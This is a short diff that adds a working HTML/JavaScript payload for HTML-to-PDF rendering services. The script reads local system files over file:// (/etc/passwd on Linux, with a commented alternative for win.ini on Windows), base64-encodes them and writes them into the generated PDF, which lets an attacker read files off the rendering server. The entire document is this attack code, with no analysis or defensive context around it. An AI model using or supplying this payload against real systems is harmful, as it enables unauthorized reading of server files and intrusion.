@@ -1,0 +1,10 @@
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.onload = function() {
+    // This will write the contents of /etc/passwd into your PDF
+    document.write("<pre>" + btoa(this.responseText) + "</pre>"); 
+  };
+  xhr.open("GET", "file:///etc/passwd"); // For Linux
+  // xhr.open("GET", "file:///C:/Windows/win.ini"); // For Windows
+  xhr.send();
+</script>
